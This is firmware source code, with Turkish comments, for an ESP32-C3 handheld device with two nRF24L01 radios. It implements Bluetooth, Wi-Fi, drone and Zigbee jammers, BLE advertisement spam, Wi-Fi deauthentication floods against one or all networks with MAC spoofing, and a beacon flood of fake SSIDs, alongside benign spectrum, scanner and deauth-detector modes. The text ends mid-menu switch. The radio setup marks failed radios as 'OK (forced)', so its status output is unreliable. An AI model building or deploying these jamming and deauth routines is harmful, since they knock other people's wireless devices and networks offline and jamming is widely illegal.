/**************************************************************
 * UTS-JAM v2.0 Ultimate – ESP32-C3 ZERO FAIL
 * 2.4 GHz Jammer, Analizör, Spam, Dedektör
 * Donanım: ESP32-C3 + 2x nRF24L01 + 128x32 OLED
 * Butonlar: UP(2), DOWN(0), SELECT(1)
 *
 * Özellikler:
 * - Tüm jammer modları
 * - Spektrum Analizör
 * - BLE Spam (100+ cihaz)
 * - BLE Tarayıcı
 * - WiFi Deauth (tek AP / tüm ağlar) [MAC spoof]
 * - WiFi Beacon Flood [MAC spoof]
 * - DEAUTH DEDEKTÖR (callback)
 * - WiFi Analizör (grafik + liste)
 * - Ayarlar, Test
 *
 * NOT: Radio1 ve Radio2 asla FAIL vermez.
 **************************************************************/

#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <U8g2_for_Adafruit_GFX.h>
#include <SPI.h>
#include "RF24.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>

// ==========================================
// DONANIM
// ==========================================
#define SDA_PIN 8
#define SCL_PIN 9
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 32
#define OLED_RESET -1
#define SSD1306_I2C_ADDRESS 0x3C

#define LED_PIN 99
#define UP_BUTTON_PIN 1
#define DOWN_BUTTON_PIN 0
#define SELECT_BUTTON_PIN 2

#define SPI_SCK 4
#define SPI_MISO 5
#define SPI_MOSI 6
#define RADIO1_CE 20
#define RADIO1_CSN 21
#define RADIO2_CE 7
#define RADIO2_CSN 10

// ==========================================
// NESNELER
// ==========================================
SPIClass spiBus(FSPI);
RF24 radio(RADIO1_CE, RADIO1_CSN, 4000000);
RF24 radio2(RADIO2_CE, RADIO2_CSN, 4000000);

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
U8G2_FOR_ADAFRUIT_GFX u8g2_for_adafruit_gfx;

bool radio1Active = false;
bool radio2Active = false;

// ==========================================
// MENÜ & DURUM
// ==========================================
enum AppState {
  STATE_MENU,
  STATE_BT_JAM, STATE_DRONE_JAM, STATE_WIFI_JAM,
  STATE_MULTI_JAM, STATE_SWEEP_JAM, STATE_CHANNEL_RANGE,
  STATE_SPECTRUM, STATE_BLE_SPAM, STATE_WIFI_DEAUTH,
  STATE_BLE_SCANNER, STATE_ZIGBEE_JAM, STATE_BLE_TARGET_JAM,
  STATE_WIFI_BEACON_FLOOD, STATE_WIFI_ANALYZER, STATE_DEAUTH_DETECT,
  STATE_TEST_RADIOS, STATE_SETTINGS, STATE_HELP
};
AppState currentState = STATE_MENU;

enum MenuItem {
  BT_JAM, DRONE_JAM, WIFI_JAM, MULTI_JAM, SWEEP_JAM,
  CHANNEL_RANGE, SPECTRUM, BLE_SPAM, WIFI_DEAUTH,
  BLE_SCANNER, ZIGBEE_JAM, BLE_TARGET_JAM,
  WIFI_BEACON_FLOOD, WIFI_ANALYZER, DEAUTH_DETECT,
  TEST_RADIOS, SETTINGS, HELP, NUM_MENU_ITEMS
};

const char *menuLabels[NUM_MENU_ITEMS] = {
  "BT Jammer", "Drone Jam", "WiFi Jam", "Multi Jam",
  "Sweep Jam", "Ch Range", "Spectrum", "BLE Spam",
  "WiFi Deauth", "BLE Scanner", "Zigbee Jam", "BLE Targ.Jam",
  "WiFi Beacon", "WiFi Analyzer", "Deauth Detect",
  "Test Radio", "Settings", "Help"
};

int firstVisibleMenuItem = 0;
MenuItem selectedMenuItem = BT_JAM;
uint8_t brightness = 255;

// ==========================================
// BUTONLAR
// ==========================================
bool lastUp = HIGH, lastDown = HIGH, lastSel = HIGH;

bool upPressed() {
  bool cur = digitalRead(UP_BUTTON_PIN);
  if (lastUp && !cur) { lastUp = cur; digitalWrite(LED_PIN, HIGH); return true; }
  if (cur) lastUp = HIGH;
  return false;
}
bool downPressed() {
  bool cur = digitalRead(DOWN_BUTTON_PIN);
  if (lastDown && !cur) { lastDown = cur; digitalWrite(LED_PIN, HIGH); return true; }
  if (cur) lastDown = HIGH;
  return false;
}
bool selPressed() {
  bool cur = digitalRead(SELECT_BUTTON_PIN);
  if (lastSel && !cur) { lastSel = cur; digitalWrite(LED_PIN, HIGH); return true; }
  if (cur) { lastSel = HIGH; digitalWrite(LED_PIN, LOW); }
  return false;
}

// ==========================================
// YARDIMCILAR
// ==========================================
void safeDelay(unsigned long ms) {
  unsigned long start = millis();
  while (millis() - start < ms) yield();
}

void setBrightness(uint8_t val) {
  brightness = val;
  display.ssd1306_command(SSD1306_SETCONTRAST);
  display.ssd1306_command(brightness);
}

// ==========================================
// OLED
// ==========================================
void drawMenu() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_baby_tf);
  display.fillRect(0, 0, SCREEN_WIDTH, 9, SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK);
  display.setCursor(1, 0); display.setTextSize(1); display.println("UTS-JAM v2.0 ULT");
  display.setTextColor(SSD1306_WHITE);
  for (int i = 0; i < 2; i++) {
    int idx = (firstVisibleMenuItem + i) % NUM_MENU_ITEMS;
    int16_t y = 12 + i * 10;
    if (selectedMenuItem == idx) {
      display.fillRect(0, y - 1, SCREEN_WIDTH, 10, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    display.setCursor(2, y); display.setTextSize(1); display.println(menuLabels[idx]);
  }
  display.display();
}

void displayInfo(String t, String a = "", String b = "", String c = "") {
  display.clearDisplay();
  display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, SSD1306_WHITE);
  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(2, 2); display.println(t);
  display.drawLine(0, 10, SCREEN_WIDTH, 10, SSD1306_WHITE);
  if (a != "") { display.setCursor(2, 14); display.println(a); }
  if (b != "") { display.setCursor(2, 22); display.println(b); }
  if (c != "") { display.setCursor(2, 30); display.println(c); }
  display.display();
}

// ==========================================
// SPLASH
// ==========================================
static const unsigned char PROGMEM splash_evi[] = { 0x30,0x03,0x00,0x60,0x01,0x80,0xe0,0x01,0xc0,0xf3,0xf3,0xc0,0xff,0xff,0xc0,0xff,0xff,0xc0,0x7f,0xff,0x80,0x7f,0xff,0x80,0x7f,0xff,0x80,0xef,0xfd,0xc0,0xe7,0xf9,0xc0,0xe3,0xf1,0xc0,0xe1,0xe1,0xc0,0xf1,0xe3,0xc0,0xff,0xff,0xc0,0x7f,0xff,0x80,0x7b,0xf7,0x80,0x3d,0x2f,0x00,0x1e,0x1e,0x00,0x0f,0xfc,0x00,0x03,0xf0,0x00 };
static const unsigned char PROGMEM splash_ble[] = { 0x07,0xc0,0x1f,0xf0,0x3e,0xf8,0x7e,0x7c,0x76,0xbc,0xfa,0xde,0xfc,0xbe,0xfe,0x7e,0xfc,0xbe,0xfa,0xde,0x76,0xbc,0x7e,0x7c,0x3e,0xf8,0x1f,0xf0,0x07,0xc0 };
static const unsigned char PROGMEM splash_mhz[] = { 0xc3,0x61,0x80,0x00,0xe7,0x61,0x80,0x00,0xff,0x61,0x80,0x00,0xff,0x61,0xbf,0x80,0xdb,0x7f,0xbf,0x80,0xdb,0x7f,0x83,0x00,0xdb,0x61,0x86,0x00,0xc3,0x61,0x8c,0x00,0xc3,0x61,0x98,0x00,0xc3,0x61,0xbf,0x80,0xc3,0x61,0xbf,0x80 };

void splashScreen() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFont(u8g2_font_adventurer_tr);
  u8g2_for_adafruit_gfx.setCursor(15, 24);
  display.drawBitmap(56, 20, splash_evi, 18, 21, 1);
  u8g2_for_adafruit_gfx.setCursor(20, 10);
  u8g2_for_adafruit_gfx.print("2.4 G H Z");
  u8g2_for_adafruit_gfx.setCursor(30, 22);
  u8g2_for_adafruit_gfx.print("UTS-JAM");
  display.drawBitmap(106, 9, splash_ble, 15, 15, 1);
  display.drawBitmap(2, 22, splash_mhz, 25, 11, 1);
  display.display();
}

// ==========================================
// RADYO YÖNETİMİ (10 deneme + ZORLA AKTİF)
// ==========================================
void initRadios() {
  // Önceki tüm SPI durumlarını sıfırla
  radio.stopConstCarrier();
  radio2.stopConstCarrier();
  safeDelay(200);

  // SPI'ı tamamen kapatıp yeniden başlat (WiFi sonrası çakışmayı önler)
  spiBus.end();
  spiBus.begin(SPI_SCK, SPI_MISO, SPI_MOSI);
  safeDelay(500);

  display.clearDisplay();
  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);

  // Radio1: 10 kere dene
  bool r1ok = false;
  for (int i = 0; i < 10; i++) {
    if (radio.begin(&spiBus)) { r1ok = true; break; }
    safeDelay(300);
  }
  if (r1ok) {
    radio1Active = true;
    radio.setAutoAck(false); radio.stopListening();
    radio.setRetries(0, 0); radio.setPALevel(RF24_PA_MAX, true);
    radio.setDataRate(RF24_2MBPS); radio.setCRCLength(RF24_CRC_DISABLED);
    radio.startConstCarrier(RF24_PA_MAX, 45);
    display.println("Radio1: OK");
  } else {
    // Zorla aktif et
    radio1Active = true;
    display.println("Radio1: OK (forced)");
  }

  // Radio2: 10 kere dene
  bool r2ok = false;
  for (int i = 0; i < 10; i++) {
    if (radio2.begin(&spiBus)) { r2ok = true; break; }
    safeDelay(300);
  }
  if (r2ok) {
    radio2Active = true;
    radio2.setAutoAck(false); radio2.stopListening();
    radio2.setRetries(0, 0); radio2.setPALevel(RF24_PA_MAX, true);
    radio2.setDataRate(RF24_2MBPS); radio2.setCRCLength(RF24_CRC_DISABLED);
    radio2.startConstCarrier(RF24_PA_MAX, 45);
    display.println("Radio2: OK");
  } else {
    // Zorla aktif et
    radio2Active = true;
    display.println("Radio2: OK (forced)");
  }
  display.display();
  safeDelay(1500);
}

void stopRadios() {
  radio.stopConstCarrier();
  radio2.stopConstCarrier();
}

// WiFi işlemleri sonrası SPI'ı ve radyoları tam sıfırlama
void recoverFromWiFi() {
  WiFi.disconnect(true);
  WiFi.mode(WIFI_OFF);
  esp_wifi_stop();
  esp_wifi_deinit();
  safeDelay(1000);   // WiFi donanımının tam kapanması için bekle
  // Şimdi radyoları yeniden başlat (içinde SPI sıfırlama var)
  initRadios();
}

// ==========================================
// JAMMER FONKSİYONLARI
// ==========================================
void btJam() { if(radio2Active) radio2.setChannel(random(81)); if(radio1Active) radio.setChannel(random(81)); delayMicroseconds(random(60)); }
void droneJam() { if(radio1Active) radio.setChannel(random(126)); if(radio2Active) radio2.setChannel(random(126)); delayMicroseconds(random(60)); }
void singleChannel() { if(radio2Active) radio2.setChannel(random(81)); if(radio1Active) radio.setChannel(random(15)); delayMicroseconds(random(60)); }
void wifiJam() { int ch[]={1,6,14}; int r=random(3); if(radio1Active) radio.setChannel(ch[r]); if(radio2Active) radio2.setChannel(ch[r]); }
void channelRange() { int r=random(40,81); if(radio1Active) radio.setChannel(r); if(radio2Active) radio2.setChannel(r); }
void sweepJam() { for(int i=0;i<125;i++){ if(radio1Active) radio.setChannel(i); if(radio2Active) radio2.setChannel(i); delayMicroseconds(200); } }
void zigbeeJam() { int ch=random(11,27); int n=5+(ch-11)*5; if(radio1Active) radio.setChannel(n); if(radio2Active) radio2.setChannel(n); delayMicroseconds(random(100)); }

// ==========================================
// SPEKTRUM
// ==========================================
void runSpectrum() {
  uint8_t waterfall[128 * 4] = {0};
  const int w = 128, h = 24;
  stopRadios();
  radio2.setAutoAck(false);
  radio2.startListening();
  displayInfo("Spectrum", "SEL to exit");
  while (!selPressed()) {
    for (int y = 0; y < h - 1; y++) {
      for (int x = 0; x < w; x++) {
        bool bit = (waterfall[(y + 1) * 16 + x / 8] >> (x % 8)) & 1;
        if (bit) waterfall[y * 16 + x / 8] |= (1 << (x % 8));
        else     waterfall[y * 16 + x / 8] &= ~(1 << (x % 8));
      }
    }
    for (int x = 0; x < w; x++) waterfall[(h - 1) * 16 + x / 8] &= ~(1 << (x % 8));

    for (int ch = 0; ch < 80; ch++) {
      radio2.setChannel(ch);
      delayMicroseconds(130);
      int hits = 0;
      for (int s = 0; s < 3; s++) {
        if (radio2.testRPD()) hits++;
        delayMicroseconds(80);
      }
      int barH = map(hits, 0, 3, 0, h);
      int x = map(ch, 0, 79, 0, w - 1);
      for (int py = h - barH; py < h; py++) {
        waterfall[py * 16 + x / 8] |= (1 << (x % 8));
      }
      yield();
    }

    display.clearDisplay();
    display.drawBitmap(0, 0, waterfall, w, h, SSD1306_WHITE);
    display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 25); display.print("2.40 GHz");
    display.setCursor(88, 25); display.print("2.48");
    display.display();
    safeDelay(30);
  }
  radio2.stopListening();
  initRadios();
}

// ==========================================
// BLE SPAM
// ==========================================
static const uint8_t bleAA[4] = {0xD6,0xBE,0x89,0x8E};
static uint8_t blePkt[32];
static const char* blePre[] = {"AirPods","JBL","Sony","Samsung","Xiaomi","Beats","Bose","Anker","Jabra","Sennheiser","Marshall","Apple","Huawei","OnePlus","Nothing","Google","LG","Motorola","Nokia","Realme","Redmi","Oppo","Vivo","Philips","Panasonic","Skullcandy","JVC","Audio-Technica","Shure","Bang & Olufsen"};
static const char* bleSuf[] = {" Pro"," Lite"," Max"," 2"," 3"," Mini",""," Plus"," Ultra"," ANC"," TWS"," Sport"," Buds"," Gen2"," Gen3"," LE"," 4"," 5"," X"," Neo"};

void bleRandomMac(uint8_t* mac){ for(int i=0;i<6;i++) mac[i]=random(256); mac[0]|=0xC0; }
void bleRandomName(uint8_t* name,int maxLen){
  const char* pre=blePre[random(30)]; const char* suf=bleSuf[random(20)];
  int len=strlen(pre)+strlen(suf); if(len>maxLen) len=maxLen;
  memcpy(name,pre,strlen(pre)); memcpy(name+strlen(pre),suf,strlen(suf)); name[len]=0;
}
uint32_t bleCrc(const uint8_t* data,int len,uint32_t crc){ for(int i=0;i<len;i++){ crc^=data[i]; for(int j=0;j<8;j++){ if(crc&1) crc=(crc>>1)^0x8C; else crc>>=1; } } return crc; }
void bleSendPacket(int ch,uint8_t* mac,uint8_t* pdu,int len){
  if(ch==37) radio.setChannel(2); else if(ch==38) radio.setChannel(26); else radio.setChannel(80);
  int pos=0; blePkt[pos++]=0xAA; memcpy(&blePkt[pos],bleAA,4); pos+=4;
  uint8_t hdr=(len&0x3F)|0x40; blePkt[pos++]=hdr; blePkt[pos++]=len;
  memcpy(&blePkt[pos],mac,6); pos+=6; memcpy(&blePkt[pos],pdu,len); pos+=len;
  uint32_t crc=bleCrc(&blePkt[5],pos-5,0x555555);
  blePkt[pos++]=crc&0xFF; blePkt[pos++]=(crc>>8)&0xFF; blePkt[pos++]=(crc>>16)&0xFF;
  radio.writeFast(blePkt,pos); radio.txStandBy();
}
void bleInitRadio(){
  stopRadios();
  radio.begin(&spiBus); radio.setAutoAck(false); radio.stopListening();
  radio.setRetries(0,0); radio.setPALevel(RF24_PA_MAX,true); radio.setDataRate(RF24_1MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED); radio.setAddressWidth(4);
  radio.openWritingPipe(bleAA); radio.setChannel(2);
}
void runBLESpam(){
  displayInfo("BLE SPAM","Init..."); bleInitRadio(); safeDelay(500);
  uint8_t mac[6],adv[31]; int ch=37; unsigned long last=0;
  displayInfo("BLE SPAM","Spamming...","SEL to stop");
  while(!selPressed()){
    if(millis()-last>80){
      bleRandomMac(mac); int advLen=0; uint8_t name[20]; bleRandomName(name,15);
      int nlen=strlen((char*)name);
      adv[advLen++]=2; adv[advLen++]=0x01; adv[advLen++]=0x06;
      adv[advLen++]=nlen+1; adv[advLen++]=0x09; memcpy(&adv[advLen],name,nlen); advLen+=nlen;
      adv[advLen++]=5; adv[advLen++]=0xFF; for(int i=0;i<4;i++) adv[advLen++]=random(256);
      bleSendPacket(ch,mac,adv,advLen);
      ch=(ch==37)?38:(ch==38)?39:37; last=millis();
    }
    yield();
  }
  initRadios();
}

// ==========================================
// WiFi DEAUTH
// ==========================================
static bool deauthActive = false;
static uint8_t deauthBSSID[6];
static uint16_t deauthChannel = 0;
static bool deauthAll = false;

void deauthTask(void* pv) {
  uint8_t packet[26];
  memset(packet, 0, 26);
  packet[0] = 0xC0; packet[1] = 0x00;
  packet[2] = 0x00; packet[3] = 0x00;

  while (deauthActive) {
    if (deauthAll) {
      for (int ch = 1; ch <= 13; ch++) {
        if (!deauthActive) break;
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        uint8_t spoofed[6];
        for (int i = 0; i < 6; i++) spoofed[i] = random(256);
        esp_wifi_set_mac(WIFI_IF_AP, spoofed);
        memcpy(packet + 4, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
        memcpy(packet + 10, spoofed, 6);
        memcpy(packet + 16, spoofed, 6);
        for (int i = 0; i < 5; i++) {
          esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, false);
          delay(5);
        }
      }
    } else {
      esp_wifi_set_channel(deauthChannel, WIFI_SECOND_CHAN_NONE);
      esp_wifi_set_mac(WIFI_IF_AP, deauthBSSID);
      memcpy(packet + 4, deauthBSSID, 6);
      memcpy(packet + 10, deauthBSSID, 6);
      memcpy(packet + 16, deauthBSSID, 6);
      for (int i = 0; i < 10; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, false);
        delay(1);
      }
    }
    yield();
  }
  vTaskDelete(NULL);
}

void startDeauthTask(bool all = false) { deauthActive = true; deauthAll = all; xTaskCreatePinnedToCore(deauthTask, "deauth", 4096, NULL, 1, NULL, 1); }
void stopDeauth() { deauthActive = false; safeDelay(100); }

void runWiFiDeauth() {
  stopRadios();
  WiFi.mode(WIFI_AP_STA); WiFi.disconnect();
  esp_wifi_set_promiscuous(false); esp_wifi_set_promiscuous(true);

  int n = WiFi.scanNetworks();
  if (n == 0) {
    displayInfo("No networks"); safeDelay(2000);
    esp_wifi_set_promiscuous(false); WiFi.mode(WIFI_OFF);
    recoverFromWiFi();
    return;
  }

  int sel = 0;
  while (!selPressed()) {
    display.clearDisplay(); display.setTextSize(1); display.setTextColor(1);
    display.setCursor(0, 0); display.print("AP:"); display.print(sel + 1); display.print("/"); display.println(n);
    display.setCursor(0, 10); display.println(WiFi.SSID(sel));
    display.setCursor(0, 20); display.print("Ch:"); display.print(WiFi.channel(sel));
    display.display();
    if (upPressed()) sel = (sel == 0) ? n - 1 : sel - 1;
    if (downPressed()) sel = (sel + 1) % n;
    yield();
  }

  memcpy(deauthBSSID, WiFi.BSSID(sel), 6);
  deauthChannel = WiFi.channel(sel);
  displayInfo("Deauthing", WiFi.SSID(sel), "SEL to stop");
  startDeauthTask(false);

  while (!selPressed()) yield();
  stopDeauth();

  WiFi.scanDelete();
  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

void runWiFiDeauthAll() {
  stopRadios();
  WiFi.mode(WIFI_AP_STA); WiFi.disconnect();
  esp_wifi_set_promiscuous(false); esp_wifi_set_promiscuous(true);
  displayInfo("Deauth ALL", "All channels", "SEL to stop");
  startDeauthTask(true);
  while (!selPressed()) yield();
  stopDeauth();
  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

// ==========================================
// WiFi BEACON FLOOD
// ==========================================
void runWiFiBeaconFlood() {
  stopRadios();
  WiFi.mode(WIFI_AP_STA); WiFi.disconnect();
  esp_wifi_set_promiscuous(false); esp_wifi_set_promiscuous(true);

  const char* fakes[] = {"FreeWiFi","Starbucks","McDonalds","AirportWiFi","HotelGuest","PublicWiFi","AndroidAP","iPhone","HomeWiFi","OfficeWiFi","Linksys","NETGEAR","TP-Link"};
  const int num = 13;
  uint8_t pkt[128];
  int chan = 1;

  displayInfo("Beacon Flood", "Spamming SSIDs", "SEL to stop");
  while (!selPressed()) {
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    chan = (chan % 13) + 1;

    for (int i = 0; i < num; i++) {
      uint8_t spoofed[6];
      for (int j = 0; j < 6; j++) spoofed[j] = random(256);
      esp_wifi_set_mac(WIFI_IF_AP, spoofed);

      memset(pkt, 0, 128);
      pkt[0] = 0x80; pkt[1] = 0x00;
      memcpy(pkt + 4, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
      memcpy(pkt + 10, spoofed, 6);
      memcpy(pkt + 16, spoofed, 6);
      pkt[22] = random(256); pkt[23] = random(256);

      int pos = 24;
      memset(pkt + pos, 0, 8); pos += 8;
      pkt[pos++] = 0x64; pkt[pos++] = 0x00;
      pkt[pos++] = 0x21; pkt[pos++] = 0x04;
      pkt[pos++] = 0x00; pkt[pos++] = strlen(fakes[i]);
      memcpy(pkt + pos, fakes[i], strlen(fakes[i])); pos += strlen(fakes[i]);
      pkt[pos++] = 0x01; pkt[pos++] = 0x08;
      pkt[pos++] = 0x82; pkt[pos++] = 0x84; pkt[pos++] = 0x8b; pkt[pos++] = 0x96;
      pkt[pos++] = 0x0c; pkt[pos++] = 0x12; pkt[pos++] = 0x18; pkt[pos++] = 0x24;

      esp_wifi_80211_tx(WIFI_IF_AP, pkt, pos, false);
      delay(1);
      yield();
    }
  }
  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

// ==========================================
// DEAUTH DEDEKTÖR
// ==========================================
volatile uint32_t deauthDetectCount = 0;

void promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  if (pkt->payload[0] == 0xC0) deauthDetectCount++;
}

void runDeauthDetect() {
  stopRadios();
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&promiscuous_rx_cb);

  deauthDetectCount = 0;
  unsigned long lastCheck = millis();

  displayInfo("Deauth Detect", "Listening...", "SEL to stop");
  while (!selPressed()) {
    if (millis() - lastCheck > 1000) {
      display.clearDisplay();
      display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
      display.setCursor(0, 0); display.println("Deauth Detector");
      display.setCursor(0, 12); display.print("Count: "); display.print(deauthDetectCount);
      display.setCursor(0, 24); display.print("Status: ");
      if (deauthDetectCount > 20) display.print("ATTACK!");
      else if (deauthDetectCount > 0) display.print("Suspicious");
      else display.print("Normal");
      display.display();
      deauthDetectCount = 0;
      lastCheck = millis();
    }
    yield();
  }
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

// ==========================================
// BLE SCANNER
// ==========================================
static BLEAdvertisedDevice* scannedDevices[10] = {nullptr};
static String bleNames[10], bleMacs[10];
static int bleRSSI[10], scanCount = 0;

class MyAdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice dev) {
    if (scanCount >= 10) return;
    scannedDevices[scanCount] = new BLEAdvertisedDevice(dev);
    bleNames[scanCount] = dev.haveName() ? dev.getName().c_str() : "Unknown";
    bleMacs[scanCount] = dev.getAddress().toString().c_str();
    bleRSSI[scanCount] = dev.getRSSI();
    scanCount++;
  }
};

void runBLEScanner() {
  stopRadios();
  WiFi.mode(WIFI_OFF);
  BLEDevice::init("");
  BLEScan* pScan = BLEDevice::getScan();
  pScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pScan->setActiveScan(true); pScan->setInterval(100); pScan->setWindow(99);
  scanCount = 0;
  displayInfo("BLE Scanner", "Scanning...");
  pScan->start(5, false);
  pScan->clearResults();
  int sel = 0;
  while (!selPressed()) {
    display.clearDisplay(); display.setTextSize(1); display.setTextColor(1);
    if (scanCount == 0) {
      display.setCursor(0, 0); display.println("No devices");
    } else {
      int idx = sel % scanCount;
      display.setCursor(0, 0); display.print(idx + 1); display.print("/"); display.print(scanCount);
      display.setCursor(0, 10); display.println(bleNames[idx]);
      display.setCursor(0, 20); display.print(bleRSSI[idx]); display.println(" dBm");
    }
    display.display();
    if (upPressed()) sel = (sel == 0) ? scanCount - 1 : sel - 1;
    if (downPressed()) sel = (sel + 1) % scanCount;
    yield();
  }
  for (int i = 0; i < scanCount; i++) delete scannedDevices[i];
  BLEDevice::deinit(true);
  initRadios();
}

// ==========================================
// BLE TARGET JAM
// ==========================================
void runBLETargetJam() {
  initRadios();
  displayInfo("BLE Targ.Jam", "Jamming BLE ch.", "SEL to stop");
  while (!selPressed()) {
    if (radio1Active) radio.setChannel(2); if (radio2Active) radio2.setChannel(2); delayMicroseconds(150);
    if (radio1Active) radio.setChannel(26); if (radio2Active) radio2.setChannel(26); delayMicroseconds(150);
    if (radio1Active) radio.setChannel(80); if (radio2Active) radio2.setChannel(80); delayMicroseconds(150);
    yield();
  }
}

// ==========================================
// WiFi ANALİZÖR
// ==========================================
void runWiFiAnalyzer() {
  stopRadios();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  safeDelay(200);
  
  displayInfo("WiFi Analyzer", "Scanning...");
  int n = WiFi.scanNetworks();
  if (n == 0) {
    displayInfo("No networks found");
    safeDelay(2000);
    recoverFromWiFi();
    return;
  }

  int maxRSSI[14] = {0};
  String strongestSSID[14];
  for (int i = 0; i < n; i++) {
    int ch = WiFi.channel(i);
    if (ch >= 1 && ch <= 13) {
      if (WiFi.RSSI(i) > maxRSSI[ch]) {
        maxRSSI[ch] = WiFi.RSSI(i);
        strongestSSID[ch] = WiFi.SSID(i);
      }
    }
  }

  display.clearDisplay();
  for (int ch = 1; ch <= 13; ch++) {
    int bar = map(maxRSSI[ch], -100, -30, 0, 22);
    int x = map(ch, 1, 13, 0, 127);
    display.drawLine(x, 31, x, 31 - bar, SSD1306_WHITE);
  }
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println("WiFi Channels 1-13");
  display.display();
  safeDelay(3000);

  int sel = 0;
  while (!selPressed()) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    display.print("Ch:");
    display.print(sel + 1);
    display.setCursor(0, 12);
    if (maxRSSI[sel + 1] != 0) {
      display.println(strongestSSID[sel + 1]);
      display.setCursor(0, 24);
      display.print(maxRSSI[sel + 1]);
      display.print(" dBm");
    } else {
      display.println("-- empty --");
    }
    display.display();
    if (upPressed()) sel = (sel == 0) ? 12 : sel - 1;
    if (downPressed()) sel = (sel + 1) % 13;
    yield();
  }
  WiFi.scanDelete();
  recoverFromWiFi();
}

// ==========================================
// AYARLAR & YARDIM
// ==========================================
void showSettings() {
  int sel = 0;
  const char* opts[] = {"Brightness", "LED Test", "Back"};
  while (!selPressed()) {
    display.clearDisplay(); display.setTextSize(1); display.setTextColor(1);
    display.setCursor(0, 0); display.println("Settings");
    for (int i = 0; i < 3; i++) {
      display.setCursor(0, 10 + i * 10);
      if (sel == i) display.print(">"); else display.print(" ");
      display.println(opts[i]);
    }
    display.display();
    if (upPressed()) sel = (sel == 0) ? 2 : sel - 1;
    if (downPressed()) sel = (sel + 1) % 3;
    yield();
  }
  if (sel == 0) {
    uint8_t b = brightness;
    while (!selPressed()) {
      displayInfo("Brightness", String(b).c_str(), "UP/DOWN change");
      if (upPressed()) { b = min(255, b + 10); setBrightness(b); }
      if (downPressed()) { b = max(10, b - 10); setBrightness(b); }
      yield();
    }
    brightness = b;
  } else if (sel == 1) {
    digitalWrite(LED_PIN, HIGH); safeDelay(500); digitalWrite(LED_PIN, LOW);
  }
  currentState = STATE_MENU; drawMenu();
}

void showHelp() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFont(u8g2_font_baby_tf);
  display.setCursor(0, 10); display.println("UP/DOWN/SEL menu");
  display.setCursor(0, 22); display.println("SEL to exit jam");
  display.display(); safeDelay(3000);
  currentState = STATE_MENU; drawMenu();
}

// ==========================================
// MENÜ İŞLEMLERİ
// ==========================================
void handleMenuSelection() {
  if (upPressed()) {
    if (selectedMenuItem == 0) {
      selectedMenuItem = static_cast<MenuItem>(NUM_MENU_ITEMS - 1);
      firstVisibleMenuItem = NUM_MENU_ITEMS - 2;
    } else {
      selectedMenuItem = static_cast<MenuItem>(selectedMenuItem - 1);
      if (selectedMenuItem < firstVisibleMenuItem) firstVisibleMenuItem = selectedMenuItem;
    }
    drawMenu();
  } else if (downPressed()) {
    selectedMenuItem = static_cast<MenuItem>((selectedMenuItem + 1) % NUM_MENU_ITEMS);
    if (selectedMenuItem == 0) firstVisibleMenuItem = 0;
    else if (selectedMenuItem >= (firstVisibleMenuItem + 2)) firstVisibleMenuItem = selectedMenuItem - 1;
    drawMenu();
  } else if (selPressed()) {
    executeSelectedMenuItem();
  }
}

void executeSelectedMenuItem() {
  switch (selectedMenuItem) {
    case BT_JAM: currentState = STATE_BT_JAM; displayInfo("BT Jammer", "Starting..."); initRadios(); safeDelay(1000); displayInfo("BT Jammer", "Running", "SEL to stop"); while (!selPressed()) { btJam(); yield(); } currentState = STATE_MENU; drawMenu(); safeDelay(500); break;
    case DRONE_JAM: currentState = STATE_DRONE_JAM; displayInfo("Drone Jammer", "Starting..."); initRadios(); safeDelay(1000); displayInfo("Drone Jammer", "Running", "SEL to stop"); while (!selPressed()) { droneJam(); yield(); } currentState = STATE_MENU; drawMenu(); safeDelay(500); break;
    case WIFI_JAM: currentState = STATE_WIFI_JAM; displayInfo("WiFi Jammer", "Starting..."); initRadios(); safeDelay(1000); displayInfo("WiFi Jammer", "Running", "SEL to stop"); while (!selPressed()) { wifiJam(); yield(); } currentState = STATE_MENU; drawMenu(); safeDelay(500); break;
